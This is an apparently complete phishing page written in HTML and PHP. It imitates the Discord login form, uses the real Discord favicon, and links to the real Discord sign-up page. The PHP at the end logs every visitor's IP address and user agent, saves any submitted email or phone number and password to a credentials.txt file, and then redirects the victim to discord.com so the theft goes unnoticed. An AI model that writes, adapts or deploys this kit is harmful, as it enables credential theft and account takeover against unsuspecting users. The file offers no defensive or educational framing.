<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<link rel="icon" type="image/x-icon" href="https://discord.com/assets/favicon.ico">
<style>
    body {
        font-family: 'Arial', sans-serif;
        background: url('background.png') no-repeat center center fixed;
        background-size: cover;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .login-container {
        background-color: rgba(44, 47, 51, 0.9);
        border: 1px solid #23272a;
        border-radius: 4px;
        padding: 20px;
        width: 350px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    .login-container h2 {
        margin-bottom: 20px;
        font-size: 24px;
        color: #fff;
    }

    .login-form input {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #23272a;
        border-radius: 4px;
        background-color: #202225;
        color: #fff;
    }

    .login-form button {
        width: 100%;
        padding: 10px;
        background-color: #7289da;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-weight: bold;
        cursor: pointer;
    }

    .signup-link {
        margin-top: 10px;
        color: #7289da;
    }

    .signup-link a {
        color: #7289da;
        text-decoration: none;
    }
</style>
</head>
<body>

<div class="login-container">
    <form class="login-form" action="" method="post">
        <h2>Log in to Discord</h2>
        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
        <div class="signup-link"> Don't have an account? <a href="https://discord.com/register">Sign Up</a></div>
    </form>
</div>

</body>
</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ip = $_SERVER['REMOTE_ADDR'] . "\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "\n|-------------------DISCORD-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
file_put_contents($filename, $data, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------DISCORD-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);
    header("Location: https://discord.com");
}
?>
